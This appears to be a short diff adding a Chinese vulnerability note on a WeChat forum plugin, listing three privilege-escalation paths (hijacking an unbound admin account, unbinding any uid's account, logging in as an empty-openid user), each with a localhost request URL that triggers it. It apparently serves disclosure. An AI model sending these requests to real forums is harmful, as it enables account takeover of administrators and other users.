@@ -1,0 +1,6 @@
+1、如果admin激活了微信的插件，但是没有去绑定微信，会将admin写入到common_member_wechatmp表里面去，这时候就可以对admin进行越权操作；
+http://localhost/upload/plugin.php?id=wechat:wechat&ac=wxregister&username={name}
+2、该漏洞还可以针对指定uid绑定的用户进行越权操作； 
+http://localhost/upload/plugin.php?id=wechat:wechat&ac=unbindmp&uid={uid}&hash={formhash}
+3、登录第一个openid为空的用户，也是可以进行越权的；
+http://localhost/upload/plugin.php?id=wechat:wechat&ac=wxregister
